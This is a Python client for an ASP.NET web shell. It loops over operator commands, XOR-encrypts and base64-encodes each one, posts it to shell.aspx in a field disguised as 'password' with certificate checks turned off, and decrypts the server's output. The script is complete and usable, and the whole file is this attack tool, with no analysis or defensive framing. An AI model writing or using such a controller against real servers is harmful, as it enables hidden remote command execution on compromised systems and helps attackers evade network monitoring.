import requests as req
import base64

url = 'https://localhost:44356/shell.aspx'
print('Path to shell: ' + url)
key = input("Enter key for encryption: ")


def main():
	while True:
		print("\n---------")
		cmd = input("Enter command: ")
		cmd = encrypt(cmd, key)
		resp = request_to_shell(cmd)
		print("Result:", decrypt(resp, key))
		# if input("Continue [n: no | other: yes]: ") == 'n':
		# 	break
	print("Bye bye!")


def decrypt(string, key):
	return  xor_string(base64.b64decode(string.encode()).decode(), key)

def encrypt(string, key):
	return base64.b64encode(xor_string(string, key).encode()).decode()

def xor_string(string, key):
	result = ''
	for i in range(len(string)):
		result += chr(ord(string[i]) ^ ord(key[i % len(key)]))
	return result

def request_to_shell(cmd):
	resp = req.post(url,
					verify= False,
					data= {"password":cmd
							# ,"XDEBUG_SESSION_START" : 15350
							})
	return resp.text


if __name__ == '__main__':
	main()
